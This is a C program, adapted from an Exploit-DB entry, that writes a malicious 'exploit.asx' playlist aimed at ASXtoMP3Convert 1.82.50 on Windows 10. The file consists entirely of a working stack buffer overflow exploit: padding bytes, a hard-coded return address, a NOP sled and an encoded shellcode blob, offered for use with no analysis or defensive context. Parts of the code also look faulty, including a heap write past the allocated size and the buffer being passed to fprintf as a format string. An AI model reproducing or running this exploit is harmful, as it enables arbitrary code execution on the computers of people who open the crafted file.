/*
Modified from https://www.exploit-db.com/exploits/38382/
Work for ASXtoMP3Convert 1.82.50 on Windows 10
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(249);
    for(i = 0; i < 255; i += 5) {
        char padding[] = "\x41\x41\x41\x41\x41";
        memcpy(overwrite_offset + i, padding, strlen(padding));
    }
    memset(overwrite_offset + _msize(overwrite_offset), 0x00, 0);

    char retn[] = "\x9d\x78\x03\x10"; // 1003789D
    char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    "\xd9\xec\xbd\x83\xb0\xf6\x27\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
    "\x52\x83\xc7\x04\x31\x6f\x13\x03\xec\xa3\x14\xd2\x0e\x2b\x5a"
    "\x1d\xee\xac\x3b\x97\x0b\x9d\x7b\xc3\x58\x8e\x4b\x87\x0c\x23"
    "\x27\xc5\xa4\xb0\x45\xc2\xcb\x71\xe3\x34\xe2\x82\x58\x04\x65"
    "\x01\xa3\x59\x45\x38\x6c\xac\x84\x7d\x91\x5d\xd4\xd6\xdd\xf0"
    "\xc8\x53\xab\xc8\x63\x2f\x3d\x49\x90\xf8\x3c\x78\x07\x72\x67"
    "\x5a\xa6\x57\x13\xd3\xb0\xb4\x1e\xad\x4b\x0e\xd4\x2c\x9d\x5e"
    "\x15\x82\xe0\x6e\xe4\xda\x25\x48\x17\xa9\x5f\xaa\xaa\xaa\xa4"
    "\xd0\x70\x3e\x3e\x72\xf2\x98\x9a\x82\xd7\x7f\x69\x88\x9c\xf4"
    "\x35\x8d\x23\xd8\x4e\xa9\xa8\xdf\x80\x3b\xea\xfb\x04\x67\xa8"
    "\x62\x1d\xcd\x1f\x9a\x7d\xae\xc0\x3e\xf6\x43\x14\x33\x55\x0c"
    "\xd9\x7e\x65\xcc\x75\x08\x16\xfe\xda\xa2\xb0\xb2\x93\x6c\x47"
    "\xb4\x89\xc9\xd7\x4b\x32\x2a\xfe\x8f\x66\x7a\x68\x39\x07\x11"
    "\x68\xc6\xd2\xb6\x38\x68\x8d\x76\xe8\xc8\x7d\x1f\xe2\xc6\xa2"
    "\x3f\x0d\x0d\xcb\xaa\xf4\xc6\x34\x82\x81\xaa\xdd\xd1\x6d\xd2"
    "\xa6\x5f\x8b\xbe\xc8\x09\x04\x57\x70\x10\xde\xc6\x7d\x8e\x9b"
    "\xc9\xf6\x3d\x5c\x87\xfe\x48\x4e\x70\x0f\x07\x2c\xd7\x10\xbd"
    "\x58\xbb\x83\x5a\x98\xb2\xbf\xf4\xcf\x93\x0e\x0d\x85\x09\x28"
    "\xa7\xbb\xd3\xac\x80\x7f\x08\x0d\x0e\x7e\xdd\x29\x34\x90\x1b"
    "\xb1\x70\xc4\xf3\xe4\x2e\xb2\xb5\x5e\x81\x6c\x6c\x0c\x4b\xf8"
    "\xe9\x7e\x4c\x7e\xf6\xaa\x3a\x9e\x47\x03\x7b\xa1\x68\xc3\x8b"
    "\xda\x94\x73\x73\x31\x1d\x83\x3e\x1b\x34\x0c\xe7\xce\x04\x51"
    "\x18\x25\x4a\x6c\x9b\xcf\x33\x8b\x83\xba\x36\xd7\x03\x57\x4b"
    "\x48\xe6\x57\xf8\x69\x23";

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size+1);

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset));
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn));
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode));
    memset(buffer + buffer_size, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer);
    fclose(fp);

    return 0;

}